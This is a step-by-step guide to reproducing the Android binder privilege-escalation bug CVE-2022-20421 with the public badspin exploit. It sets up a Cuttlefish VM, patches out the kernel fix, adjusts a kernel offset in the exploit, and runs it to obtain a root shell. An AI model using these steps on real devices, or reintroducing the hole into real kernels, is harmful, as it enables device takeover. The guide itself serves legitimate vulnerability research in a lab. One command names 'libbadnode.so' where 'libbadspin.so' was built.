Instructions and overview to reproduce CVE-2022-20421 (https://github.com/0xkol/badspin/tree/main)
This reproduction uses cuttlefish, so an ARM server with KVM virtualization support is needed.
# Setup Cuttlefish
Roughly follow https://source.android.com/docs/devices/cuttlefish/get-started

First part to clone goes the same:
```sh
sudo apt install -y git devscripts equivs config-package-dev debhelper-compat golang curl
git clone https://github.com/google/android-cuttlefish
```

However, on the debian version I was on, libtinfo5 was no longer available, so I had to use libtinfo6.
Apply the following patch if there is an issue with this:
```diff
diff --git a/base/debian/control b/base/debian/control  
index 80a3be138..492b8d1e1 100644  
--- a/base/debian/control  
+++ b/base/debian/control  
@@ -13,7 +13,7 @@ Build-Depends: bazel [amd64],  
               libgoogle-glog-dev,  
               libgtest-dev,  
               libjsoncpp-dev,  
-               libtinfo5,  
+               libtinfo6,  
               libprotobuf-c-dev,  
               libprotobuf-dev,  
               libssl-dev,
```

Run the rest of the commands to install cuttlefish the same as on the website:
```sh
tools/buildutils/build_packages.sh
sudo dpkg -i ./cuttlefish-base_*_*64.deb || sudo apt-get install -f
sudo dpkg -i ./cuttlefish-user_*_*64.deb || sudo apt-get install -f
sudo usermod -aG kvm,cvdnetwork,render $USER
sudo reboot
```

Cuttlefish requires and android image and host package to run also. Follow instructions on the website and download host tools for android13 with a 5.10 kernel, and extract them both into the same folder.

# Building Vulnerable Kernel

I used the `common-android13-5.10-2025-03`, which did have the bug fixed, but I reintroduced the bug. The commit which fixes the bug is https://android.googlesource.com/kernel/common/+/19bb609b45fbbab4cfd9a8765dc8cb9c90cfda34.

To reintroduce the bug, clone the kernel as follows:
```sh
mkdir common-android13-5.10-2025-03
cd common-android13-5.10-2025-03
repo init --partial-clone --no-use-superproject -u https://android.googlesource.com/kernel/manifest -b common-android13-5.10-2025-03
repo sync -c -j8
```
It may take quite a while to clone the kernel.

Then apply the following patch:
```diff
diff --git a/drivers/android/binder.c b/drivers/android/binder.c  
index bebc9827ef05..521e7d638ba5 100644  
--- a/drivers/android/binder.c  
+++ b/drivers/android/binder.c  
@@ -1556,7 +1556,8 @@ static int binder_inc_ref_for_node(struct binder_proc *proc,  
       }  
       ret = binder_inc_ref_olocked(ref, strong, target_list);  
       *rdata = ref->data;  
-       if (ret && ref == new_ref) {  
+       // patch out CVE-2022-20421 fix to run badspin exploit  
+       //if (ret && ref == new_ref) {  
               /*  
                * Cleanup the failed reference here as the target  
                * could now be dead and have already released its  
@@ -1564,9 +1565,9 @@ static int binder_inc_ref_for_node(struct binder_proc *proc,  
                * with strong=0 and a tmp_refs will not decrement  
                * the node. The new_ref gets kfree'd below.  
                */  
-               binder_cleanup_ref_olocked(new_ref);  
-               ref = NULL;  
-       }  
+               //binder_cleanup_ref_olocked(new_ref);  
+               //ref = NULL;  
+       //}  
   
       binder_proc_unlock(proc);  
       if (new_ref && ref != new_ref)
```

Then build the kernel using the following command (note: it may take a lot of memory (~20 GB) to build the kernel):
```sh
tools/bazel run //common-modules/virtual-device:virtual_device_aarch64_dist
```

The kernel image will be present at `out/android13-5.10/dist/Image`, and the init ramdisk will be present at `out/android13-5.10/dist/initramfs.img`. Copy these files over to the arm server.

# Building Badspin
Install android studio cli tools, and use those to install ndk.

Badspin will need to be modified slightly, just changing 1 offset.
Run the following command to get the offset of `anon_pipe_buf_ops`:
```
$ readelf -s out/android13-5.10/dist/vmlinux | grep 'anon_pipe_buf_ops'
199165: ffffffc012024da8    32 OBJECT  LOCAL  DEFAULT    3 anon_pipe_buf_ops
```

Replace the address in the `offset_kbase` function like shown below:
```diff
--- a/badspin_reproduction/src/rw.c  
+++ b/badspin_reproduction/src/rw.c  
@@ -568,7 +568,7 @@ u64 noop_kbase(struct rw_info *rw) {  
u64 offset_kbase(struct rw_info *rw) {  
    //return rw->ki.pipe_buffer_ops - OFFCHK(dev_config->kconsts.kernel_offsets.k_anon_pipe_buf_ops);  
    // MODIFIED  
-    return rw->ki.pipe_buffer_ops - (0xffffffc00a03f868 - 0xffffffc008000000);  
+    return rw->ki.pipe_buffer_ops - (0xffffffc012024da8 - 0xffffffc008000000);  
}
```

Then compile badspin with:
```sh
cd src/
ANDROID_NDK_HOME=/path/to/android_sdk/ndk/25.2.9519653/ make all
```

This will produce a `libbadspin.so` shared library.

# Running Custom Kernel
Navigate to folder where android image and host tools was extracted to earlier. Copy the `Image` and `initramfs.img` files to this folder, and to start cuttlefish run:
```sh
HOME=$PWD ./bin/launch_cvd -kernel_path=./Image -initramfs_path=initramfs.img -cpus 8
```
Note badspin requires at least 5 CPUs I think, I used 8 to be safe.

# Running Badspin Exploit
Starting in the same folder as previously, run the following command to upload `libbadspin.so` to cuttlefish device:
```sh
HOME=$PWD ./bin/adb push libbadnode.so /data/local/tmp
```

Get a shell on the device with the command (run command until it finds the device):
```sh
HOME=$PWD ./bin/adb shell
```

To run the badspin exploit, in the adb shell, run:
```sh
LD_PRELOAD=/data/local/tmp/libbadspin.so sleep 1
```

It seems to have a 10%-20% success rate, if the device crashes, just re upload `libbadspin.so`, reconnect `adb shell`, and try again.
Badspin repo seems to suggest exploit is unstable for first few minutes device is up, so waiting a bit before running may help.

If exploit succeeds, it should spawn a root shell.

# Badspin Issues Encountered
- First issue: kernel hangs after `triggering UAF` printed
	- This is caused by not enough cpus being available in cuttlefish VM
	- Raise CPU number from 2 to 8
- Second Issue: `epool_ctl` fails with`ENOSPC` when setting up timerfd race extension trick
	- This is caused by epoll user watch limit in `/proc/sys/fs/epoll/max_user_watches` being hit
	- Exploit makes about 50000 epoll entries per try
	- Limit is around 16600
	- Instead set amount used around 15000
